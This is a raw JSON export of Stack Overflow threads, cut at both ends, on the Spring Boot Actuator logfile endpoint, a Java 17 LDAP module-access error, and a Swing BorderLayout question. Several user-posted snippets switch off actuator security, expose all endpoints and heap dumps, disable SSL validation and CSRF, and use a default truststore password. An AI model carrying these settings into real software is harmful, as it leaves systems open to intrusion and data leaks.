Boot","body":"<p>I added below code to enable /logfile endpoint</p>\n\n<pre><code>pom.xml\n-----------\n\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n\n\napplication.properties\n-----------------------\n\nmanagement.security.enabled=false\nendpoints.env.enabled=false\nendpoints.configprops.enabled=false\nendpoints.autoconfig.enabled=false\nendpoints.beans.enabled=false\nendpoints.dump.enabled=true\nendpoints.heapdump.enabled=true\nlogging.level.root=info\nlogging.file=target/app.log\n</code></pre>\n"},{"tags":[],"owner":{"account_id":53506,"reputation":676,"user_id":159972,"accept_rate":15,"display_name":"Allahbaksh Asadullah"},"down_vote_count":1,"up_vote_count":1,"is_accepted":false,"score":0,"last_activity_date":1575416235,"creation_date":1575416235,"answer_id":59166970,"question_id":33938997,"body_markdown":"I had below lines in my application.properties . I am using spring-boot with actuator\r\n\r\n    logging.file.name=./logs/log-file.log\r\n    management.endpoints.web.exposure.include=*\r\n\r\nWithout the management extension line, the response was\r\n\r\n    Whitelabel Error Page This application has no explicit mapping for /error, so you are seeing this as a fallback.\r\n    \r\n    Wed Dec 04 05:04:40 IST 2019 There was an unexpected error (type=Not Found, status=404). No message available\r\n","title":"logfile endpoint in Spring Boot","body":"<p>I had below lines in my application.properties . I am using spring-boot with actuator</p>\n\n<pre><code>logging.file.name=./logs/log-file.log\nmanagement.endpoints.web.exposure.include=*\n</code></pre>\n\n<p>Without the management extension line, the response was</p>\n\n<pre><code>Whitelabel Error Page This application has no explicit mapping for /error, so you are seeing this as a fallback.\n\nWed Dec 04 05:04:40 IST 2019 There was an unexpected error (type=Not Found, status=404). No message available\n</code></pre>\n"},{"tags":[],"owner":{"account_id":3982217,"reputation":1,"user_id":3283865,"display_name":"user3283865"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1585664297,"creation_date":1585664297,"answer_id":60952807,"question_id":33938997,"body_markdown":"I had used below for \r\n\r\n\r\nversion 2.1.3 -&gt; management.endpoint.logfile=C:/apps/Benefits-logs/adapt-rest.log\r\nas you can see class **LogFileWebEndpointProperties** \r\n\r\nand this also works\r\nlogging.file=C:/apps/Benefits-logs/adapt-rest.log\r\n\r\nNo need to add logging.path. If you see LogFileCondition class you will get to know.","title":"logfile endpoint in Spring Boot","body":"<p>I had used below for </p>\n\n<p>version 2.1.3 -> management.endpoint.logfile=C:/apps/Benefits-logs/adapt-rest.log\nas you can see class <strong>LogFileWebEndpointProperties</strong> </p>\n\n<p>and this also works\nlogging.file=C:/apps/Benefits-logs/adapt-rest.log</p>\n\n<p>No need to add logging.path. If you see LogFileCondition class you will get to know.</p>\n"},{"tags":[],"owner":{"account_id":2509435,"reputation":95,"user_id":2182274,"display_name":"Yves-Marie L."},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683713964,"creation_date":1683713964,"answer_id":76217262,"question_id":33938997,"body_markdown":"I&#39;m using Spring Boot 2.7.5 and using the config server.\r\n\r\nAlthough I noticed that logging.file.name works when the application.properties is embedded in the project, it didn&#39;t work when configured in the config server.\r\n\r\nI had to use this property:\r\n\r\n    management.endpoint.logfile.external-file=${logging.file.name}","title":"logfile endpoint in Spring Boot","body":"<p>I'm using Spring Boot 2.7.5 and using the config server.</p>\n<p>Although I noticed that logging.file.name works when the application.properties is embedded in the project, it didn't work when configured in the config server.</p>\n<p>I had to use this property:</p>\n<pre><code>management.endpoint.logfile.external-file=${logging.file.name}\n</code></pre>\n"}],"owner":{"account_id":1559437,"reputation":11728,"user_id":1449676,"accept_rate":37,"display_name":"ps-aux"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":21991,"favorite_count":0,"down_vote_count":0,"up_vote_count":14,"accepted_answer_id":34755808,"answer_count":6,"score":14,"last_activity_date":1683713964,"creation_date":1448541625,"question_id":33938997,"body_markdown":"I read Spring Boot Actuator [documentation][1] and saw `logfile` endpoint mentioned there which would really come in handy.\r\n\r\nHowever this endpoint is not registered in my app and I have no idea how to make it available. What is needed here? \r\n\r\n  [1]: http://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-endpoints.html#production-ready-customizing-endpoints","title":"logfile endpoint in Spring Boot","body":"<p>I read Spring Boot Actuator <a href=\"http://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-endpoints.html#production-ready-customizing-endpoints\" rel=\"noreferrer\">documentation</a> and saw <code>logfile</code> endpoint mentioned there which would really come in handy.</p>\n\n<p>However this endpoint is not registered in my app and I have no idea how to make it available. What is needed here? </p>\n"},{"tags":["java","spring-boot","gradle","ldap","spring-ldap"],"answers":[{"tags":[],"owner":{"account_id":5795637,"reputation":7297,"user_id":4571544,"display_name":"dekkard"},"down_vote_count":0,"up_vote_count":7,"is_accepted":true,"score":7,"last_activity_date":1659425453,"creation_date":1659422960,"answer_id":73203114,"question_id":73202366,"body_markdown":"Try adding `--add-exports java.naming/com.sun.jndi.ldap=ALL-UNNAMED` instead of `--add-exports java.naming/com.sun.jndi.ldap=spring.ldap.core` to your JVM arguments.\r\n\r\nBut a better solution would be to align all the dependency versions with the Spring Boot version you use (2.6.6):\r\n- for `org.springframework.boot:spring-boot-starter-security` either remove the version or set `2.6.6`\r\n- `org.springframework.security:spring-security-ldap:5.4.3` is too old, should be at least version *5.6.2*. With this one chances are you won&#39;t need any explicit `--add-exports` at all.\r\n- remove `org.springframework.ldap:spring-ldap-core` - `org.springframework.security:spring-security-ldap` brings it in automatically.","title":"LdapCtxFactory because module java.naming does not export com.sun.jndi.ldap to unnamed module","body":"<p>Try adding <code>--add-exports java.naming/com.sun.jndi.ldap=ALL-UNNAMED</code> instead of <code>--add-exports java.naming/com.sun.jndi.ldap=spring.ldap.core</code> to your JVM arguments.</p>\n<p>But a better solution would be to align all the dependency versions with the Spring Boot version you use (2.6.6):</p>\n<ul>\n<li>for <code>org.springframework.boot:spring-boot-starter-security</code> either remove the version or set <code>2.6.6</code></li>\n<li><code>org.springframework.security:spring-security-ldap:5.4.3</code> is too old, should be at least version <em>5.6.2</em>. With this one chances are you won't need any explicit <code>--add-exports</code> at all.</li>\n<li>remove <code>org.springframework.ldap:spring-ldap-core</code> - <code>org.springframework.security:spring-security-ldap</code> brings it in automatically.</li>\n</ul>\n"},{"tags":[],"owner":{"account_id":26342788,"reputation":41,"user_id":20001640,"display_name":"Marco"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1663773386,"creation_date":1663773386,"answer_id":73803225,"question_id":73202366,"body_markdown":"For me it worked to add:\r\n```\r\n--add-opens=java.naming/com.sun.jndi.ldap=ALL-UNNAMED\r\n```\r\ninstead of --add-exports","title":"LdapCtxFactory because module java.naming does not export com.sun.jndi.ldap to unnamed module","body":"<p>For me it worked to add:</p>\n<pre><code>--add-opens=java.naming/com.sun.jndi.ldap=ALL-UNNAMED\n</code></pre>\n<p>instead of --add-exports</p>\n"},{"tags":[],"owner":{"account_id":6850354,"reputation":95,"user_id":5267710,"display_name":"Vincent Jyotirmoy Singha - JS"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1683713930,"creation_date":1683713930,"answer_id":76217255,"question_id":73202366,"body_markdown":"This solution may be applicable to those who don&#39;t want to use `--add-exports` explicitly.\r\n&lt;br&gt;In my case, the issue was resolved after upgrading and using correct ldap core jar. Previously it was using *2.2.0.RELEASE* version.\r\n\r\n    &lt;dependency&gt;\r\n\t\t&lt;groupId&gt;org.springframework.ldap&lt;/groupId&gt;\r\n\t\t&lt;artifactId&gt;spring-ldap-core&lt;/artifactId&gt;\r\n        &lt;!-- version&gt;2.2.0.RELEASE&lt;/version --&gt;\r\n\t\t&lt;version&gt;3.0.2&lt;/version&gt;\r\n\t&lt;/dependency&gt;","title":"LdapCtxFactory because module java.naming does not export com.sun.jndi.ldap to unnamed module","body":"<p>This solution may be applicable to those who don't want to use <code>--add-exports</code> explicitly.\n<br>In my case, the issue was resolved after upgrading and using correct ldap core jar. Previously it was using <em>2.2.0.RELEASE</em> version.</p>\n<pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;org.springframework.ldap&lt;/groupId&gt;\n    &lt;artifactId&gt;spring-ldap-core&lt;/artifactId&gt;\n    &lt;!-- version&gt;2.2.0.RELEASE&lt;/version --&gt;\n    &lt;version&gt;3.0.2&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre>\n"}],"owner":{"account_id":2990507,"reputation":4955,"user_id":2538180,"accept_rate":53,"display_name":"emoleumassi"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":7694,"favorite_count":0,"down_vote_count":0,"up_vote_count":4,"accepted_answer_id":73203114,"answer_count":3,"score":4,"last_activity_date":1683713930,"creation_date":1659418159,"question_id":73202366,"body_markdown":"WebSecurityConfigurerAdapter:\r\n```\r\n@Component\r\n@EnableWebSecurity\r\npublic class SecurityConfiguration extends WebSecurityConfigurerAdapter\r\n{\r\n   @Override\r\n   protected void configure(HttpSecurity httpSecurity) throws Exception\r\n   {\r\n      httpSecurity\r\n               .authorizeRequests()\r\n               .antMatchers(&quot;/abc/**&quot;).permitAll()\r\n               .anyRequest()\r\n               .authenticated()\r\n               .and()\r\n               .csrf()\r\n               .disable()\r\n               .httpBasic();\r\n   }\r\n\r\n   @Override\r\n   public void configure(AuthenticationManagerBuilder auth) throws Exception\r\n   {\r\n      auth.ldapAuthentication()\r\n          .userDnPatterns(&quot;uid={0},ou=people&quot;)\r\n          .userSearchBase(&quot;ou=people&quot;)\r\n          .userSearchFilter(&quot;uid={0}&quot;)\r\n          .groupSearchBase(&quot;ou=groups&quot;)\r\n          .groupSearchFilter(&quot;uniqueMember={0}&quot;)\r\n          .contextSource()\r\n          .url(&quot;ldap://localhost:8389/dc=concretepage,dc=com&quot;)\r\n          .and()\r\n          .passwordCompare()\r\n          .passwordEncoder(passwordEncoder())\r\n          .passwordAttribute(&quot;userPassword&quot;);\r\n   }\r\n\r\n   @Bean\r\n   public PasswordEncoder passwordEncoder() {\r\n      BCryptPasswordEncoder passwordEncoder = new BCryptPasswordEncoder();\r\n      return passwordEncoder;\r\n   }\r\n```\r\n\r\nSpring-Version: `SPRING_BOOT_VERSION = &quot;2.6.6&quot;`\r\n\r\n```\r\nplugins {\r\n    id &#39;java-library&#39;\r\n}\r\n\r\ndependencies {\r\n    implementation &quot;org.springframework.boot:spring-boot:${SPRING_BOOT_VERSION}&quot;\r\n    implementation &quot;org.springframework.boot:spring-boot-starter-web:${SPRING_BOOT_VERSION}&quot;\r\n    implementation &quot;org.springframework.boot:spring-boot-starter-thymeleaf:${SPRING_BOOT_VERSION}&quot;\r\n\r\n    api &quot;javax.servlet:javax.servlet-api:${JAVAX_SERVLET_VERSION}&quot;\r\n\r\n    compileOnly &#39;io.crnk:crnk-gen-java&#39; \r\n    annotationProcessor &#39;io.crnk:crnk-gen-java&#39;\r\n\r\n    gradle.beforeProject { Project project -&gt;\r\n        project.with {\r\n            apply plugin: &#39;io.spring.dependency-management&#39;\r\n            dependencyManagement {\r\n                imports {\r\n                    mavenBom &quot;io.crnk:crnk-bom:${CRNK_VERSION}&quot;\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n\r\n    implementation platform(&quot;io.crnk:crnk-bom:${CRNK_VERSION}&quot;)\r\n    annotationProcessor platform(&quot;io.crnk:crnk-bom:${CRNK_VERSION}&quot;)\r\n\r\n    implementation &quot;io.crnk:crnk-setup-spring-boot2&quot;\r\n    implementation &quot;io.crnk:crnk-home&quot;\r\n\r\n    implementation &quot;io.crnk:crnk-security&quot;\r\n    implementation &#39;org.springframework.boot:spring-boot-starter-security:2.7.2&#39;\r\n    implementation &#39;org.springframework.ldap:spring-ldap-core&#39;\r\n    implementation &#39;org.springframework.security:spring-security-ldap:5.4.3&#39;\r\n    implementation &#39;com.unboundid:unboundid-ldapsdk:4.0.14&#39;\r\n\r\n    testImplementation(&quot;org.springframework.boot:spring-boot-starter-test:${SPRING_BOOT_VERSION}&quot;)\r\n}\r\n\r\n```\r\n\r\ngradle.properties:\r\n```\r\nsystemProp.http.ssl.insecure=true\r\nsystemProp.http.ssl.allowall=true\r\nsystemProp.http.ssl.ignore.validity.dates=true\r\n\r\norg.gradle.jvmargs=-Djavax.net.ssl.trustStore=&quot;./cacerts&quot; -Djavax.net.ssl.trustStorePassword=changeit \\\r\n  --add-exports java.naming/com.sun.jndi.ldap=spring.ldap.core\r\n```\r\n\r\n./gradlew --version  \r\n```\r\n------------------------------------------------------------\r\nGradle 7.4.2\r\n------------------------------------------------------------\r\n\r\nBuild time:   2022-03-31 15:25:29 UTC\r\nRevision:     540473b8118064efcc264694cbcaa4b677f61041\r\n\r\nKotlin:       1.5.31\r\nGroovy:       3.0.9\r\nAnt:          Apache Ant(TM) version 1.10.11 compiled on July 10 2021\r\nJVM:          17.0.2 (Oracle Corporation 17.0.2+8-86)\r\nOS:           Windows 10 10.0 amd64\r\n\r\n```\r\n\r\nThe error:\r\n```\r\nError starting ApplicationContext. To display the conditions report re-run your application with &#39;debug&#39; enabled.\r\n2022.08.02 07:16:32.051 [main] ERROR o.s.boot.SpringApplication:830 - Application run failed\r\norg.springframework.beans.factory.BeanCreationException: Error creating bean with name &#39;springSecurityFilterChain&#39; defined in class path resource [org/springframework/security/config/annotation/web/configuration/WebSecurityConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [javax.servlet.Filter]: Factory method &#39;springSecurityFilterChain&#39; threw exception; nested exception is java.lang.IllegalAccessError: class org.springframework.ldap.core.support.AbstractContextSource (in unnamed module @0x1d296da) cannot access class com.sun.jndi.ldap.LdapCtxFactory (in module java.naming) because module java.naming does not export com.sun.jndi.ldap to unnamed module @0x1d296da\r\n\tat org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:658)\r\n\tat org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:486)\r\n\tat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1352)\r\n\tat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1195)\r\n\tat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:582)\r\n\tat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:542)\r\n\tat org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335)\r\n\tat org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234)\r\n\tat org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333)\r\n\tat org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208)\r\n\tat org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:322)\r\n\tat org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208)\r\n\tat org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:953)\r\n\tat org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918)\r\n\tat org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:583)\r\n\tat org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:145)\r\n\tat org.springframework.boot.SpringApplication.refresh(SpringApplication.java:740)\r\n\tat org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:415)\r\n\tat org.springframework.boot.SpringApplication.run(SpringApplication.java:303)\r\n\tat org.springframework.boot.SpringApplication.run(SpringApplication.java:1312)\r\n\tat org.springframework.boot.SpringApplication.run(SpringApplication.java:1301)\r\n```","title":"LdapCtxFactory because module java.naming does not export com.sun.jndi.ldap to unnamed module","body":"<p>WebSecurityConfigurerAdapter:</p>\n<pre><code>@Component\n@EnableWebSecurity\npublic class SecurityConfiguration extends WebSecurityConfigurerAdapter\n{\n   @Override\n   protected void configure(HttpSecurity httpSecurity) throws Exception\n   {\n      httpSecurity\n               .authorizeRequests()\n               .antMatchers(&quot;/abc/**&quot;).permitAll()\n               .anyRequest()\n               .authenticated()\n               .and()\n               .csrf()\n               .disable()\n               .httpBasic();\n   }\n\n   @Override\n   public void configure(AuthenticationManagerBuilder auth) throws Exception\n   {\n      auth.ldapAuthentication()\n          .userDnPatterns(&quot;uid={0},ou=people&quot;)\n          .userSearchBase(&quot;ou=people&quot;)\n          .userSearchFilter(&quot;uid={0}&quot;)\n          .groupSearchBase(&quot;ou=groups&quot;)\n          .groupSearchFilter(&quot;uniqueMember={0}&quot;)\n          .contextSource()\n          .url(&quot;ldap://localhost:8389/dc=concretepage,dc=com&quot;)\n          .and()\n          .passwordCompare()\n          .passwordEncoder(passwordEncoder())\n          .passwordAttribute(&quot;userPassword&quot;);\n   }\n\n   @Bean\n   public PasswordEncoder passwordEncoder() {\n      BCryptPasswordEncoder passwordEncoder = new BCryptPasswordEncoder();\n      return passwordEncoder;\n   }\n</code></pre>\n<p>Spring-Version: <code>SPRING_BOOT_VERSION = &quot;2.6.6&quot;</code></p>\n<pre><code>plugins {\n    id 'java-library'\n}\n\ndependencies {\n    implementation &quot;org.springframework.boot:spring-boot:${SPRING_BOOT_VERSION}&quot;\n    implementation &quot;org.springframework.boot:spring-boot-starter-web:${SPRING_BOOT_VERSION}&quot;\n    implementation &quot;org.springframework.boot:spring-boot-starter-thymeleaf:${SPRING_BOOT_VERSION}&quot;\n\n    api &quot;javax.servlet:javax.servlet-api:${JAVAX_SERVLET_VERSION}&quot;\n\n    compileOnly 'io.crnk:crnk-gen-java' \n    annotationProcessor 'io.crnk:crnk-gen-java'\n\n    gradle.beforeProject { Project project -&gt;\n        project.with {\n            apply plugin: 'io.spring.dependency-management'\n            dependencyManagement {\n                imports {\n                    mavenBom &quot;io.crnk:crnk-bom:${CRNK_VERSION}&quot;\n                }\n            }\n        }\n    }\n\n\n    implementation platform(&quot;io.crnk:crnk-bom:${CRNK_VERSION}&quot;)\n    annotationProcessor platform(&quot;io.crnk:crnk-bom:${CRNK_VERSION}&quot;)\n\n    implementation &quot;io.crnk:crnk-setup-spring-boot2&quot;\n    implementation &quot;io.crnk:crnk-home&quot;\n\n    implementation &quot;io.crnk:crnk-security&quot;\n    implementation 'org.springframework.boot:spring-boot-starter-security:2.7.2'\n    implementation 'org.springframework.ldap:spring-ldap-core'\n    implementation 'org.springframework.security:spring-security-ldap:5.4.3'\n    implementation 'com.unboundid:unboundid-ldapsdk:4.0.14'\n\n    testImplementation(&quot;org.springframework.boot:spring-boot-starter-test:${SPRING_BOOT_VERSION}&quot;)\n}\n\n</code></pre>\n<p>gradle.properties:</p>\n<pre><code>systemProp.http.ssl.insecure=true\nsystemProp.http.ssl.allowall=true\nsystemProp.http.ssl.ignore.validity.dates=true\n\norg.gradle.jvmargs=-Djavax.net.ssl.trustStore=&quot;./cacerts&quot; -Djavax.net.ssl.trustStorePassword=changeit \\\n  --add-exports java.naming/com.sun.jndi.ldap=spring.ldap.core\n</code></pre>\n<p>./gradlew --version</p>\n<pre><code>------------------------------------------------------------\nGradle 7.4.2\n------------------------------------------------------------\n\nBuild time:   2022-03-31 15:25:29 UTC\nRevision:     540473b8118064efcc264694cbcaa4b677f61041\n\nKotlin:       1.5.31\nGroovy:       3.0.9\nAnt:          Apache Ant(TM) version 1.10.11 compiled on July 10 2021\nJVM:          17.0.2 (Oracle Corporation 17.0.2+8-86)\nOS:           Windows 10 10.0 amd64\n\n</code></pre>\n<p>The error:</p>\n<pre><code>Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled.\n2022.08.02 07:16:32.051 [main] ERROR o.s.boot.SpringApplication:830 - Application run failed\norg.springframework.beans.factory.BeanCreationException: Error creating bean with name 'springSecurityFilterChain' defined in class path resource [org/springframework/security/config/annotation/web/configuration/WebSecurityConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [javax.servlet.Filter]: Factory method 'springSecurityFilterChain' threw exception; nested exception is java.lang.IllegalAccessError: class org.springframework.ldap.core.support.AbstractContextSource (in unnamed module @0x1d296da) cannot access class com.sun.jndi.ldap.LdapCtxFactory (in module java.naming) because module java.naming does not export com.sun.jndi.ldap to unnamed module @0x1d296da\n    at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:658)\n    at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:486)\n    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1352)\n    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1195)\n    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:582)\n    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:542)\n    at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335)\n    at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234)\n    at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333)\n    at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208)\n    at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:322)\n    at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208)\n    at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:953)\n    at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918)\n    at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:583)\n    at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:145)\n    at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:740)\n    at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:415)\n    at org.springframework.boot.SpringApplication.run(SpringApplication.java:303)\n    at org.springframework.boot.SpringApplication.run(SpringApplication.java:1312)\n    at org.springframework.boot.SpringApplication.run(SpringApplication.java:1301)\n</code></pre>\n"},{"tags":["java","user-interface","jframe","jpanel","border-layout"],"comments":[{"owner":{"account_id":27042470,"reputation":11,"user_id":20597124,"display_name":"catlover"},"score":0,"creation_date":1683717166,"post_id":76217228,"comment_id":134408520,"body_markdown":"I think the MouseEvent is only listened when I click on the center part of the Frame. I was wondering if the JPanel that is added to the CENTER section automatically extends to other areas that are not occupied if the rest of the BorderLayout has no components, is that right?","body":"I think the MouseEvent is only listened when I click on the center part of the Frame. I was wondering if the JPanel that is added to the CENTER section automatically extends to other areas that are not occupied if the rest of the BorderLayout has no components, is that right?"},{"owner":{"account_id":27042470,"reputation":11,"user_id":20597124,"display_name":"catlover"},"score":0,"creation_date":1683721368,"post_id":76217228,"comment_id":134409586,"body_markdown":"Oh! Roger that, thank you for your explaination!","body":"Oh! Roger that, thank you for your explaination!"}],"owner":{"account_id":27042470,"reputation":11,"user_id":20597124,"display_name":"catlover"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":18,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1683713732,"creation_date":1683713732,"question_id":76217228,"body_markdown":"I am trying to set a **BorderLayout** of my JFrame.\r\n\r\nFirstly create a **FlowLayout** with two JButtons. Then add the FlowLayout the top of BorderLayout. It works correctly according to my code.\r\n\r\nSecondly, I created a **MyPanel** object which is inherited from **JPanel**. There is a **MouseAdapter** to realize when the mouse left click panel output mouse coordinates.\r\n\r\nEverything works fine but I found the MouseEvent will be listened and output the coordinate wherever I click the mouse except the top panel.\r\n\r\nMy question is: Wouldn&#39;t the mouse event be triggered only if I clicked on the middle part of the frame, because I added the mouse listener to MyPanel, which was added to the **CENTER** position of BorderLayout.\r\n\r\nFollowing is my code:\r\n```\r\nimport javax.swing.*;\r\nimport java.awt.event.*;\r\npublic class MyPanel extends JPanel{\r\n\tpublic MyPanel() {\r\n\t\t//anonymous class to listen mouse \r\n\t\tthis.addMouseListener(new MouseAdapter() {\r\n\t\t\t@Override\r\n\t\t\tpublic void mouseClicked(MouseEvent e) {\r\n\t\t\t\t//if left click\r\n\t\t\t\tif (e.getButton() == MouseEvent.BUTTON1) {\r\n                    //print location message\r\n                    System.out.println(&quot;Left button clicked at position (&quot; + e.getX() + &quot;, &quot; + e.getY() + &quot;)&quot;);\r\n                }\r\n\t\t\t}\r\n\t\t});\r\n\t}\r\n}\r\n```\r\n```\r\nimport javax.swing.*;\r\nimport java.awt.*;\r\npublic class MyFrame extends JFrame{\r\n\tpublic MyFrame() {\r\n\t\t//initial settings of frame\r\n\t\tthis.setSize(400, 300);\r\n\t\tthis.setTitle(&quot;MyFrame Title&quot;);\r\n\t\tthis.setLocationRelativeTo(null);\r\n\t\tthis.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\r\n\t\t//set layout of frame\r\n\t\tBorderLayout l1 = new BorderLayout();\r\n\t\tthis.setLayout(l1);\r\n\t\t\r\n\t\t//set top panel\r\n\t\tJPanel top = new JPanel(new FlowLayout(FlowLayout.CENTER));\r\n\t\t//buttons in top panel\r\n\t\tJButton b1 = new JButton(&quot;Left&quot;);\r\n\t\tJButton b2 = new JButton(&quot;Right&quot;);\r\n\t\t//add to top of frame\r\n\t\tthis.add(top,BorderLayout.PAGE_START);\r\n\t\t\r\n\t\t//add my panel to center of frame\r\n\t\tMyPanel center = new MyPanel();\r\n\t\tthis.add(center,BorderLayout.CENTER);\r\n\t\t//add buttons\r\n\t\ttop.add(b1);\r\n\t\ttop.add(b2);\r\n\t\t\r\n\t\t//make it visible\r\n\t\tthis.setVisible(true);\r\n\t}\r\n}\r\n```","title":"Question about JPanel cover the whole area of BorderLayout when using BorderLayout.CENTER","body":"<p>I am trying to set a <strong>BorderLayout</strong> of my JFrame.</p>\n<p>Firstly create a <strong>FlowLayout</strong> with two JButtons. Then add the FlowLayout the top of BorderLayout. It works correctly according to my code.</p>\n<p>Secondly, I created a <strong>MyPanel</strong> object which is inherited from <strong>JPanel</strong>. There is a <strong>MouseAdapter</strong> to realize when the mouse left click panel output mouse coordinates.</p>\n<p>Everything works fine but I found the MouseEvent will be listened and output the coordinate wherever I click the mouse except the top panel.</p>\n<p>My question is: Wouldn't the mouse event be triggered only if I clicked on the middle part of the frame, because I added the mouse listener to MyPanel, which was added to the <strong>CENTER</strong> position of BorderLayout.</p>\n<p>Following is my code:</p>\n<pre><code>import javax.swing.*;\nimport java.awt.event.*;\npublic class MyPanel extends JPanel{\n    public MyPanel() {\n        //anonymous class to listen mouse \n        this.addMouseListener(new MouseAdapter() {\n            @Override\n            public void mouseClicked(MouseEvent e) {\n                //if left click\n                if (e.getButton() == MouseEvent.BUTTON1) {\n                    //print location message\n                    System.out.println(&quot;Left button clicked at position (&quot; + e.getX() + &quot;, &quot; + e.getY() + &quot;)&quot;);\n                }\n            }\n        });\n    }\n}\n</code></pre>\n<pre><code>import javax.swing.*;\nimport java.awt.*;\npublic class MyFrame extends JFrame{\n    public MyFrame() {\n        //initial settings of frame\n        this.setSize(400, 300);\n        this.setTitle(&quot;MyFrame Title&quot;);\n        this.setLocationRelativeTo(null);\n        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        //set layout of frame\n        BorderLayout l1 = new BorderLayout();\n        this.setLayout(l1);\n        \n        //set top panel\n        JPanel top = new JPanel(new FlowLayout(FlowLayout.CENTER));\n        //buttons in top panel\n        JButton b1 = new JButton(&quot;Left&quot;);\n        JButton b2 = new JButton(&quot;Right&quot;);\n        //add to top of frame\n        this.add(top,BorderLayout.PAGE_START);\n        \n        //add my panel to center of frame\n        MyPanel center = new MyPanel();\n        this.add(center,BorderLayout.CENTER);\n        //add buttons\n        top.add(b1);\n        top.add(b2);\n        \n        //make it visible\n        this.setVisible(true);\n    }\n}\n</code></pre>\n"},{"tags":["java","date","time","timedelta","java.util.date"],"comments":[{"owner":{"account_id":17514,"reputation":21306,"user_id":39277,"accept_rate":94,"display_name":"Doctor Jones"},"score":12,"creation_date":1336043656,"post_id":1555262,"comment_id":13461123,"body_markdown":"Why no love for joda time?  It&#39;s pretty much the best option if you&#39;re going to deal with dates in java.","body":"Why no love for joda time?  It&#39;s pretty much the best option if you&#39;re going to deal with dates in java."},{"owner":{"account_id":30319,"reputation":90360,"user_id":82609,"accept_rate":84,"display_name":"Sebastien Lorber"},"score":9,"creation_date":1363087194,"post_id":1555262,"comment_id":21699995,"body_markdown":"Please check my elegant 2 liner solution, without using Joda and giving the result in any TimeUnit at http://stackoverflow.com/a/10650881/82609","body":"Please check my elegant 2 liner solution, without using Joda and giving the result in any TimeUnit at <a 